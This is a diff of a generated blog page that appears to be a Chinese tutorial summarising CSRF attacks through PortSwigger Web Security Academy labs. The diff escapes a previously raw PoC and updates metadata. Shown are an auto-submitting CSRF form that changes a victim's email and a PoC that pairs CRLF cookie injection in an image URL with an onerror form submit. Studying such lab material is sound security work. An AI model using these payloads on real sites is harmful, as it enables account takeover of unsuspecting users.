@@ -38,7 +38,6 @@
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-47.png">
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-58.png">
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-02.png">
-<meta property="og:image" content="https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=123456%3b%20SameSite=None">
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-17.png">
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-16.png">
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-28.png">
@@ -47,7 +46,7 @@
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-33.png">
 <meta property="og:image" content="http://example.com/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-35.png">
 <meta property="article:published_time" content="2024-02-06T12:16:21.000Z">
-<meta property="article:modified_time" content="2024-02-06T15:03:51.700Z">
+<meta property="article:modified_time" content="2024-02-06T15:08:46.384Z">
 <meta property="article:author" content="liuty">
 <meta property="article:tag" content="漏洞总结">
 <meta name="twitter:card" content="summary_large_image">
@@ -273,7 +272,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k 字
+          2.7k 字
         
       </span>
     
@@ -284,7 +283,7 @@
         
         
         
-          22 分钟
+          23 分钟
         
       </span>
     
@@ -351,7 +350,7 @@
 <img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/ae23ebf70d53939f7ed0052a3576698.png" srcset="/img/loading.gif" lazyload class="" title="ae23ebf70d53939f7ed0052a3576698.png">
 <h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>例如，假设应用程序包含一个允许用户更改其帐户上的电子邮件地址的功能。当用户执行此操作时，他们会发出如下一个 HTTP 请求：</p>
 <p>POST &#x2F;email&#x2F;change HTTP&#x2F;1.1<br>Host: vulnerable-website.com<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 30<br>Cookie: session&#x3D;yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</p>
-<p>email&#x3D;<a href="mailto:&#x77;&#105;&#101;&#110;&#101;&#x72;&#64;&#x6e;&#x6f;&#114;&#x6d;&#97;&#x6c;&#x2d;&#117;&#x73;&#101;&#114;&#x2e;&#99;&#x6f;&#x6d;">&#x77;&#105;&#101;&#110;&#101;&#x72;&#64;&#x6e;&#x6f;&#114;&#x6d;&#97;&#x6c;&#x2d;&#117;&#x73;&#101;&#114;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p>email&#x3D;<a href="mailto:&#119;&#x69;&#x65;&#110;&#101;&#x72;&#x40;&#x6e;&#x6f;&#114;&#x6d;&#97;&#x6c;&#45;&#x75;&#115;&#101;&#x72;&#x2e;&#99;&#111;&#109;">&#119;&#x69;&#x65;&#110;&#101;&#x72;&#x40;&#x6e;&#x6f;&#114;&#x6d;&#97;&#x6c;&#45;&#x75;&#115;&#101;&#x72;&#x2e;&#99;&#111;&#109;</a></p>
 <p>这满足了CSRF所需的条件：<br>1、攻击者通常能够触发密码重置并完全控制用户的帐户<br>2、应用程序使用会话 cookie 来识别发出请求的用户<br>3、攻击者可以轻松执行、修改操作所需的请求参数的值</p>
 <p>具备这些条件后，攻击者就可以构建包含以下 HTML 的网页：</p>
  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
@@ -362,7 +361,7 @@
 <h2 id="CSRF漏洞常见利用方式"><a href="#CSRF漏洞常见利用方式" class="headerlink" title="CSRF漏洞常见利用方式"></a>CSRF漏洞常见利用方式</h2><p>下面我将用burpsuite官方靶场环境来做演示</p>
 <h3 id="无防御措施的CSRF漏洞"><a href="#无防御措施的CSRF漏洞" class="headerlink" title="无防御措施的CSRF漏洞"></a>无防御措施的CSRF漏洞</h3><p>首先使用提供的账号密码登录实验室 wiener:peter</p>
 <img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-22.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-05_20-22.png">
-<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>可以看到此时默认邮箱是 <a href="mailto:&#119;&#105;&#x65;&#x6e;&#x65;&#114;&#x40;&#110;&#x6f;&#x72;&#109;&#x61;&#108;&#x2d;&#117;&#115;&#x65;&#x72;&#x2e;&#110;&#101;&#x74;">&#119;&#105;&#x65;&#x6e;&#x65;&#114;&#x40;&#110;&#x6f;&#x72;&#109;&#x61;&#108;&#x2d;&#117;&#115;&#x65;&#x72;&#x2e;&#110;&#101;&#x74;</a> ，我们先随便模拟修改邮箱账号修改一个并抓个包</p>
+<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>可以看到此时默认邮箱是 <a href="mailto:&#119;&#105;&#x65;&#110;&#x65;&#114;&#x40;&#110;&#111;&#x72;&#109;&#97;&#108;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#110;&#101;&#x74;">&#119;&#105;&#x65;&#110;&#x65;&#114;&#x40;&#110;&#111;&#x72;&#109;&#97;&#108;&#x2d;&#x75;&#115;&#101;&#114;&#x2e;&#110;&#101;&#x74;</a> ，我们先随便模拟修改邮箱账号修改一个并抓个包</p>
 <img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-25.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-05_20-25.png">
 <h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>我们可以看到，数据包中只提交了一个修改后的邮箱数据，这里我们可以直接使用 burp 自带的功能来生成 POC，把邮箱修改成我们想要的攻击效果，也就是只需要修改 value 中的值就可以了</p>
 <img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-26_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-05_20-26_1.png">
@@ -393,17 +392,7 @@
 <img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-58.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-05_21-58.png">
 <h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-02.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-05_22-02.png">
 <h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>那么我们就可以在自己的上构造一个响应，让它去请求刚才存在CRLF漏洞上的资源，然后发起一个请求来实现 CRLF 注入，之后再发送请求去修改邮箱就可以，首先还是用burpsuite先生成一个csrf的poc,然后对其修改：利用 img 标签去请求 web-security-academy.net（存在CRLF漏洞的完整URL）上的一个不存在的图片，当它发送这个请求的时候， web-security-academy.net 的 cookie 中的 csrf 键将被设置为 csrf&#x3D;123456，当请求失败的时候，就会提交我们的 CSRF 代码来修改邮箱</p>
- <html>
-<!-- CSRF PoC - generated by Burp Suite Professional -->
-<body>
-  <form action="https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/my-account/change-email" method="POST">
-    <input type="hidden" name="email" value="111&#64;normal&#45;user&#46;net" />
-    <input type="hidden" name="csrf" value="123456" />
-    <input type="submit" value="Submit request" />
-  </form>
-    <img src="https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=123456%3b%20SameSite=None" srcset="/img/loading.gif" lazyload  onerror="document.forms[0].submit();"/>
-</body>
-</html>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111<span class="hljs-symbol">&amp;#64;</span>normal<span class="hljs-symbol">&amp;#45;</span>user<span class="hljs-symbol">&amp;#46;</span>net&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=123456%3b%20SameSite=None&quot;</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit();&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-17.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-05_22-17.png">
 <h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-16.png" srcset="/img/loading.gif" lazyload class="" title="2024-02-05_22-16.png">
